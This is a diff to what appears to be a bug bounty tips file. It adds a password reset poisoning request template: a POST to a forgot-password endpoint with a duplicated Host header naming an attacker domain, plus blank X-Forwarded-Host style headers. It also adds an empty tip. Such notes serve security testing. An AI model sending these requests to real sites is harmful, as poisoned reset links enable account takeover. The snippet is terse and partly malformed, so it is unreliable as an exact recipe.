@@ -179,10 +179,22 @@ url: site[.]com,password and username.
 
 ### Tips 17
 ```
+Reset password poisoning Bug
 
+POST /login/forget-password
+HTTP/1.1
+Host : site[dot]com
+Host: attack-doamin
+----------more added
+X-Forwarded-Server:
+X-Forwarded-Host:
+X-Host:
 ```
 
+### Tips 18
+```
 
+```
 
 
 
